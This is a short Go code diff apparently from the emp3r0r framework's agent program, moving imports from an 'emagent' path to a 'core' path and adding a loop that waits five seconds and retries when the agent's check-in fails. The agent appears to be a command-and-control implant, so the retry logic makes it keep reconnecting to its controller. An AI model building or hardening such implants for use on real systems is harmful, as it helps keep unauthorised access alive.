@@ -6,8 +6,8 @@ import (
 	"os"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
-	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent"
+	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 )
 
 func main() {
@@ -51,6 +51,8 @@ connect:
 	err := agent.CheckIn()
 	if err != nil {
 		log.Println("CheckIn: ", err)
+		time.Sleep(5 * time.Second)
+		goto connect
 	}
 	log.Println("Checked in")
 
